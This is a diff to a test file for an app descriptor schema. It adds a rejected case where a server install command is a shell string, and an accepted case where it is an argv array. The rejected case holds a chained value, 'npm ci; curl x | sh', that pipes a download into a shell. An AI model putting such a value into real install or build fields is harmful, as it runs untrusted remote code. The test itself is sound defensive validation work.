@@ -69,6 +69,10 @@ describe("descriptorSchema", () => {
     ["the sandboxed runtime", { runtime: "sandboxed" }],
     ["a service with no server", { type: "service" }],
     ["a static app with a server", { server: { command: ["node", "s.js"], portEnv: "PORT" } }],
+    [
+      "a server install as a shell string",
+      { type: "service", server: { command: ["node", "s.js"], install: "npm ci; curl x | sh", portEnv: "PORT" } },
+    ],
     ["an id with a slash", { id: "a/b" }],
     // `x-…` is what an app installed from a URL is called.
     ["an id starting with x-", { id: "x-0123456789ab" }],
@@ -285,6 +289,21 @@ describe("descriptorSchema version 2", () => {
         }),
       ).success,
     ).toBe(true);
+  });
+
+  it("accepts a server's own install as an argv", () => {
+    const parsed = parse(
+      suite({
+        type: "service",
+        server: {
+          command: ["node", "s.js"],
+          install: ["npm", "ci", "--omit=dev", "--workspace=server"],
+          portEnv: "PORT",
+        },
+      }),
+    );
+    expect(parsed.success).toBe(true);
+    expect(parsed.data?.server?.install).toEqual(["npm", "ci", "--omit=dev", "--workspace=server"]);
   });
 
   it("accepts extensions with dots and whole names in opens", () => {
